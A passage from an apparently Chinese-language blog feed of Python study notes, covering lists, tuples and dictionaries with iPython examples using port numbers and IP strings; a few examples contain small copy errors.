class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>学了这两个知识点之后，答案是这样的:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    string = <span class="built_in">input</span>()</span><br><span class="line">    <span class="comment"># 或者先获取 t = type(string) ，然后使用 t.isalnum 调用，不过，没太大必要，毕竟本身 input() 就返回字符串</span></span><br><span class="line">    <span class="keyword">for</span> method <span class="keyword">in</span> [<span class="built_in">str</span>.isalnum, <span class="built_in">str</span>.isalpha, <span class="built_in">str</span>.isdigit, <span class="built_in">str</span>.islower, <span class="built_in">str</span>.isupper]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">any</span>(method <span class="keyword">for</span> c <span class="keyword">in</span> string))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><ol type="1"><li>函数引用 使用示例:</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">89</span>]: t = <span class="built_in">print</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">90</span>]: t(<span class="string">&quot;Hello&quot;</span>, <span class="string">&quot;World&quot;</span>, sep=<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">Hello</span><br><span class="line">World</span><br></pre></td></tr></table></figure><h2 id="参考推荐">参考推荐</h2><blockquote><p><ahref="https://towardsdatascience.com/assignment-shallow-or-deep-a-story-about-pythons-memory-management-b8fad87bfa6c">Assignment,Shallow Copy, Or Deep Copy?</a> &gt; <ahref="https://secon.utulsa.edu/cs2123/slides/pypass.pdf">Pass by ObjectReference in Python</a> &gt; <ahref="http://radar.oreilly.com/2014/10/python-tuples-immutable-but-potentially-changing.html">Pythontuples: immutable but potentially changing</a> &gt; <ahref="http://winterttr.me/2015/10/24/python-passing-arguments-as-value-or-reference/">Python的函数参数传递：传值？引用？</a> &gt; <ahref="https://medium.com/swlh/6-things-to-understand-python-data-mutability-b52f5c5db191">6Things to Understand Python Data Mutability</a> &gt; <ahref="https://docs.python.org/3/library/copy.html">copy — Shallow anddeep copy operations</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python collections</title>
      <link href="/blog/2020/03/21/programming/python/1.basic/3.collections/"/>
      <url>/blog/2020/03/21/programming/python/1.basic/3.collections/</url>
      
        <content type="html"><![CDATA[<h1 id="知识点回顾">知识点回顾</h1><ul><li>Python 中数据类型可以分为 <strong>数字型</strong> 和<strong>非数字型</strong></li><li>数字型<ul><li>整型 ( <code>int</code> )</li><li>浮点型（ <code>float</code> ）</li><li>布尔型（ <code>bool</code> ）<ul><li>真 <code>True</code> <code>非 0 数</code> ——<strong>非零即真</strong></li><li>假 <code>False</code> <code>0</code></li></ul></li><li>复数型 ( <code>complex</code> )<ul><li>主要用于科学计算，例如：平面场问题、波动问题、电感电容等问题</li></ul></li></ul></li><li>非数字型<ul><li>字符串</li><li>列表</li><li>元组</li><li>字典</li></ul></li></ul><h1 id="python-collections">Python Collections</h1><p>Four collection data types</p><table><thead><tr class="header"><th>collection</th><th>ordered</th><th>changeable</th><th>indexable</th><th>duplicate</th></tr></thead><tbody><tr class="odd"><td>List</td><td>ordered</td><td>changeable</td><td>indexed</td><td>Allow</td></tr><tr class="even"><td>Tuple</td><td>ordered</td><td>unchangeable</td><td>indexed</td><td>Allow</td></tr><tr class="odd"><td>Set</td><td>unordered</td><td>changeable</td><td>unindexed</td><td>Not Allow</td></tr><tr class="even"><td>Dictionary</td><td>unordered</td><td>changeable</td><td>indexed</td><td>Not Allow</td></tr></tbody></table><ul><li><strong>List</strong> is a collection which is <strong>ordered andchangeable. Allows duplicate members</strong>.</li><li><strong>Tuple</strong> is a collection which is <strong>ordered andunchangeable. Allows duplicate members.</strong></li><li><strong>Set</strong> is a collection which is <strong>unordered andunindexed. No duplicate members.</strong></li><li><strong>Dictionary</strong> is a collection which is<strong>unordered, changeable and indexed. No duplicatemembers.</strong></li></ul><p>When choosing a collection type, it is useful to understand theproperties of that type. Choosing the right type for a particular dataset could mean retention of meaning, and, it could mean an increase inefficiency or security.</p><ul><li>在 <code>Python</code> 中，所有 <strong>非数字型变量</strong>都支持以下特点：<ol type="1"><li>都是一个 <strong>序列</strong> <code>sequence</code> ，也可以理解为<strong>容器</strong></li><li><strong>取值</strong> <code>[]</code></li><li><strong>遍历</strong> <code>for in</code></li><li><strong>计算长度</strong>、<strong>最大/最小值</strong>、<strong>比较</strong>、<strong>删除</strong></li><li><strong>链接</strong> <code>+</code> 和 <strong>重复</strong><code>*</code></li><li><strong>切片</strong></li></ol></li></ul><h1 id="列表">列表</h1><h2 id="列表的定义">列表的定义</h2><ul><li>列表的 <strong>索引</strong> 从 <code>0</code> 开始</li></ul><blockquote><p>注意：从列表中取值时，如果<strong>超出索引范围</strong>，程序会报错</p></blockquote><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200316085700183_1206077136.png" /></p><h2 id="列表常用操作">列表常用操作</h2><ul><li>在 <code>ipython3</code> 中定义一个 <strong>列表</strong>，例如：<code>name_list = []</code></li><li>输入 <code>name_list.</code> 按下 <code>TAB</code> 键，<code>ipython</code> 会提示 <strong>列表</strong> 能够使用的<strong>方法</strong> 如下：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [1]: name_list.</span><br><span class="line">name_list.append   name_list.count    name_list.insert   name_list.reverse</span><br><span class="line">name_list.clear    name_list.extend   name_list.pop      name_list.sort</span><br><span class="line">name_list.copy     name_list.index    name_list.remove</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th style="text-align: left;">序号</th><th>分类</th><th>关键字 / 函数 / 方法</th><th>说明</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">1</td><td>增加</td><td>列表.insert(索引, 数据)</td><td>在指定位置插入数据</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>列表.append(数据</td><td>在末尾追加数据</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>列表.extend(列表 2)</td><td>将列表 2 的数据追加到列表</td></tr><tr class="even"><td style="text-align: left;">2</td><td>修改</td><td>列表[索引] = 数据</td><td>修改指定索引的数据</td></tr><tr class="odd"><td style="text-align: left;">3</td><td>删除</td><td>del 列表[索引](科普)</td><td>删除指定索引的数据</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>列表.remove[数据]</td><td>删除第一个出现的指定数据</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>列表.pop</td><td>删除末尾数据</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>列表.pop(索引)</td><td>删除指定索引数据</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>列表.clear</td><td>清空列表</td></tr><tr class="even"><td style="text-align: left;">4</td><td>统计</td><td>len(列表)</td><td>列表长度</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>列表.count(数据)</td><td>数据在列表中出现的次数</td></tr><tr class="even"><td style="text-align: left;">5</td><td>排序</td><td>列表.sort()</td><td>升序排序</td></tr><tr class="odd"><td style="text-align: left;"></td><td></td><td>列表.sort(reverse=True)</td><td>降序排序</td></tr><tr class="even"><td style="text-align: left;"></td><td></td><td>列表.reverse()</td><td>逆序、反转</td></tr></tbody></table><h3 id="sort">sort()</h3><ol type="1"><li>Definition and Usage</li></ol><p>The <code>sort()</code> method sorts the list ascending by default.This function can be used to sort list of integers, floating pointnumber, string and others.</p><p>You can also make a function to decide the sorting criteria(s).</p><ol start="2" type="1"><li>Syntax</li></ol><p><em>list</em>.sort(reverse=True|False, key=myFunc)</p><ol start="3" type="1"><li>Parameter Values</li></ol><table><colgroup><col style="width: 10%" /><col style="width: 89%" /></colgroup><thead><tr class="header"><th style="text-align: left;">Parameter</th><th style="text-align: left;">Description</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">reverse</td><td style="text-align: left;">Optional. reverse=True will sort the listdescending. Default is reverse=False</td></tr><tr class="even"><td style="text-align: left;">key</td><td style="text-align: left;">Optional. A function to specify thesorting criteria(s)</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">32</span>]: words</span><br><span class="line">Out[<span class="number">32</span>]: [<span class="string">&#x27;Geeks&#x27;</span>, <span class="string">&#x27;For&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: words.sort()</span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: words</span><br><span class="line">Out[<span class="number">34</span>]: [<span class="string">&#x27;For&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>, <span class="string">&#x27;Geeks&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#  整数升序</span></span><br><span class="line">In [<span class="number">28</span>]: lis = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: lis.sort()</span><br><span class="line"></span><br><span class="line"><span class="comment">#  降序：</span></span><br><span class="line">In [<span class="number">30</span>]: lis</span><br><span class="line">Out[<span class="number">30</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">36</span>]: lis.sort(reverse=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">37</span>]: lis</span><br><span class="line">Out[<span class="number">37</span>]: [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure><h3 id="append-extend">append &amp; extend</h3><p>append 将其参数作为一个元素，追加到列表尾部， 列表的长度会+1 appendadds its argument as a single element to the end of a list. The lengthof the list itself will increase by one.</p><p>extend对其参数进行迭代，将其参数的每一个元素加到列表中扩展列表，列表的长度会增加可迭代参数中元素的个数那么多.extend iterates over its argument adding each element to the list,extending the list. The length of the list will increase by however manyelements were in the iterable argument.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">37</span>]: t_list = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: t_list.append([<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">In [<span class="number">39</span>]: t_list</span><br><span class="line">Out[<span class="number">39</span>]: [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: t_list</span><br><span class="line">Out[<span class="number">40</span>]: [<span class="number">1</span>, <span class="number">2</span>, [<span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: t_list = [<span class="number">1</span>,<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: t_list.extend([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>])</span><br><span class="line">In [<span class="number">43</span>]: t_list</span><br><span class="line">Out[<span class="number">43</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><h3 id="del-关键字科普">del 关键字（科普）</h3><ul><li>使用 <code>del</code> 关键字( <code>delete</code> )同样可以删除列表中元素</li><li><code>del</code> 关键字本质上是用来<strong>将一个变量从内存中删除的</strong></li><li>如果使用 <code>del</code>关键字将变量从内存中删除，后续的代码就不能再使用这个变量了</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">del</span> name_list[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><blockquote><p>在日常开发中，要从列表删除数据，建议<strong>使用列表提供的方法</strong></p></blockquote><h3 id="关键字函数和方法科普">关键字、函数和方法（科普）</h3><ul><li><strong>关键字</strong> 是 Python 内置的、具有特殊意义的标识符</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> keyword</span><br><span class="line">In [<span class="number">2</span>]: <span class="built_in">print</span>(keyword.kwlist)</span><br><span class="line">In [<span class="number">3</span>]: <span class="built_in">print</span>(<span class="built_in">len</span>(keyword.kwlist))</span><br></pre></td></tr></table></figure><blockquote><p>关键字后面不需要使用括号</p></blockquote><ul><li><strong>函数</strong> 封装了独立功能，可以直接调用</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数名(参数)</span><br></pre></td></tr></table></figure><blockquote><p>函数需要死记硬背</p></blockquote><ul><li><strong>方法</strong> 和函数类似，同样是封装了独立的功能</li><li><strong>方法</strong> 需要通过 <strong>对象</strong>来调用，表示针对这个 <strong>对象</strong> 要做的操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象.方法名(参数)</span><br></pre></td></tr></table></figure><blockquote><p>在变量后面输入 <code>.</code>，然后选择针对这个变量要执行的操作，记忆起来比函数要简单很多</p></blockquote><h2 id="循环遍历">循环遍历</h2><ul><li><strong>遍历</strong> 就是 <strong>从头到尾</strong><strong>依次</strong> 从 <strong>列表</strong> 中获取数据<ul><li>在 <strong>循环体内部</strong> 针对<strong>每一个元素</strong>，执行相同的操作</li></ul></li><li>在 <code>Python</code> 中为了提高列表的遍历效率，专门提供的<strong>迭代 iteration 遍历</strong></li><li>使用 <code>for</code> 就能够实现迭代遍历</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># for 循环内部使用的变量 in 列表</span></span><br><span class="line"><span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line"></span><br><span class="line">    循环内部针对列表元素进行操作</span><br><span class="line">    <span class="built_in">print</span>(name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/1584284533_20200225174303701_6227.png" /></p><h2 id="应用场景">应用场景</h2><ul><li>尽管 <code>Python</code> 的 <strong>列表</strong> 中可以<strong>存储不同类型的数据</strong></li><li>但是在开发中，更多的应用场景是<ol type="1"><li><strong>列表存储相同类型的数据</strong></li><li>通过<strong>迭代遍历</strong>，在循环体内部，针对列表中的每一项元素，执行相同的操作</li></ol></li></ul><h1 id="列表常用方法">列表常用方法</h1><p>列表中的数据可变，类型可不一致</p><p>索引：</p><ol type="1"><li>第一个元素索引为 0，倒数第一个元素索引为-1</li><li>Range of Indexes 根据索引指定取 list 中的哪一段：list[2:5]，前闭后开，包含 list[2]，不包含 list[5]。此外，：前或后的元素不 i写，表示到头或尾。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports=[<span class="number">21</span>,<span class="number">22</span>,<span class="number">3306</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]</span><br><span class="line"><span class="number">3306</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[-<span class="number">1</span>]</span><br><span class="line"><span class="number">3306</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">1</span>:]</span><br><span class="line">[<span class="number">22</span>,<span class="number">3306</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[:<span class="number">2</span>]</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>]</span><br></pre></td></tr></table></figure><p>append()方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports.append(<span class="string">&#x27;ssh&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports</span><br><span class="line">[<span class="number">21</span>, <span class="number">22</span>, <span class="number">3306</span>, <span class="string">&#x27;ssh&#x27;</span>]</span><br></pre></td></tr></table></figure><p>len(list) 长度</p><p>删除元素：</p><p>pop() 基于索引删除</p><p>The <code>pop()</code> method removes the specified index, (or thelast item if index is not specified):</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ports.append(8080)</span><br><span class="line">&gt;&gt;&gt; ports</span><br><span class="line">[21, 22, 3306, 8080]</span><br></pre></td></tr></table></figure><p>remove 基于值删除</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; ports.remove(&#x27;ssh&#x27;)</span><br></pre></td></tr></table></figure><p>index()</p><p>The <code>index()</code> method finds the <strong>first</strong>occurrence of the specified value.</p><p>确定值的索引，然后使用索引来修改值。如果不存在该值，会抛出异常</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports.index(<span class="number">3306</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]=<span class="number">45</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ports[<span class="number">2</span>]</span><br><span class="line"><span class="number">45</span></span><br></pre></td></tr></table></figure><p>find() 与 index()类似，唯一区别是找不到值，会返回-1，而不会抛出异常。</p><p>rindex() The <code>rindex()</code> method finds the last occurrenceof the specified value.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[<span class="number">0</span>:ip.rindex(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br></pre></td></tr></table></figure><p>list(str) 将字符串逐个字符拆分成列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">list</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">[<span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>]</span><br></pre></td></tr></table></figure><p>练习：</p><p>去除 IP 的 D 段：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">方法一：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip[<span class="number">0</span>:ip.rindex(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br><span class="line">方法二：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip=<span class="string">&#x27;192.168.1.2&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;.&#x27;</span>.join(ip.split(<span class="string">&#x27;.&#x27;</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br><span class="line">方法三：</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>ip_list[<span class="number">0</span>]+<span class="string">&#x27;.&#x27;</span>+ip_list[<span class="number">1</span>]+<span class="string">&#x27;.&#x27;</span>+ip_list[<span class="number">2</span>]</span><br><span class="line"><span class="string">&#x27;192.168.1&#x27;</span></span><br></pre></td></tr></table></figure><p>元组：</p><p>元组不可变，只有：count 和 index 方法。</p><p>如果元组中只有一个元素，那么在元素后面必须加上逗号，否则就成了单个数字了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=(<span class="number">1</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x=(<span class="number">1</span>,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>x</span><br><span class="line">(<span class="number">1</span>,)</span><br></pre></td></tr></table></figure><p>字典：</p><p>列表中存放大量数据时，查找性能会下降。字典适合存储大量数据。</p><p>字典的优点是具有极快的查找速度，字典使用{}定义。字典使用 key：value形式存储。each pair is called one item. 字典中的每个 key 与其 value都是以冒号分隔，同时用都好分割每一项。</p><p>字典中没有索引，字典中的键是唯一的，值随便，可重复。字典中的值也可以改。</p><p>keys() 查看所有键</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>service</span><br><span class="line">&#123;<span class="string">&#x27;ftp&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;ssh&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;http&#x27;</span>: <span class="number">80</span>, <span class="string">&#x27;mysql&#x27;</span>: <span class="number">3306</span>, <span class="string">&#x27;rdp&#x27;</span>: <span class="number">3389</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>service[<span class="string">&#x27;ftp&#x27;</span>]</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>service.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;rdp&#x27;</span>])</span><br></pre></td></tr></table></figure><p>values() 方法查看所有值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>service.keys()</span><br><span class="line">dict_keys([<span class="string">&#x27;ftp&#x27;</span>, <span class="string">&#x27;ssh&#x27;</span>, <span class="string">&#x27;http&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>, <span class="string">&#x27;rdp&#x27;</span>])</span><br></pre></td></tr></table></figure><p>字典的遍历：</p><p>遍历键：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p>遍历值:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(service[i])</span><br></pre></td></tr></table></figure><p>同时遍历键和值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> service:</span><br><span class="line"><span class="meta">... </span>    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>:<span class="subst">&#123;service[i]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="元组">元组</h1><h2 id="元组的定义">元组的定义</h2><ul><li><code>Tuple</code> （元组）与列表类似，不同之处在于元组的<strong>元素不能修改</strong><ul><li><strong>元组</strong> 表示多个元素组成的序列</li><li><strong>元组</strong> 在 <code>Python</code>开发中，有特定的应用场景</li></ul></li><li>用于存储 <strong>一串 信息</strong>，<strong>数据</strong> 之间使用<code>,</code> 分隔</li><li>元组用 <code>()</code> 定义</li><li>元组的 <strong>索引</strong> 从 <code>0</code> 开始<ul><li><strong>索引</strong> 就是数据在 <strong>元组</strong>中的位置编号</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = (<span class="string">&quot;zhangsan&quot;</span>, <span class="number">18</span>, <span class="number">1.75</span>)</span><br></pre></td></tr></table></figure><h2 id="创建空元组">创建空元组</h2><p>注意：在开发中几乎不定义空元组，因为元组是不可变的。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = ()</span><br></pre></td></tr></table></figure><h2id="元组中-只包含一个元素-时需要在元素后面添加逗号-否则就只是中单个元素的那种类型">元组中<strong>只包含一个元素</strong>时，需要<strong>在元素后面添加逗号</strong>,否则就只是()中单个元素的那种类型</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">info_tuple = (<span class="number">50</span>, )</span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">type</span>(info_tuple)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="built_in">tuple</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">11</span>]: single=(<span class="string">&quot;world&quot;</span>)</span><br><span class="line">In [<span class="number">12</span>]: <span class="built_in">type</span>(single)</span><br><span class="line">Out[<span class="number">12</span>]: <span class="built_in">str</span></span><br></pre></td></tr></table></figure><h2 id="元组常用操作">元组常用操作</h2><ul><li>取值与取索引</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">    In [<span class="number">22</span>]: info</span><br><span class="line">    Out[<span class="number">22</span>]: (<span class="string">&#x27;zhangsan&#x27;</span>, <span class="number">18</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    In [<span class="number">23</span>]: info[<span class="number">0</span>]</span><br><span class="line">    Out[<span class="number">23</span>]: <span class="string">&#x27;zhangsan&#x27;</span></span><br><span class="line">    In [<span class="number">25</span>]: info.index(<span class="string">&quot;zhangsan&quot;</span>)</span><br><span class="line">    Out[<span class="number">25</span>]: <span class="number">0</span></span><br><span class="line">    ```</span><br><span class="line"></span><br><span class="line">* 统计计数</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">``` python</span><br><span class="line">  In [<span class="number">26</span>]: info = (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">3</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>In [27]: info.count(3)<br />Out[27]: 2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 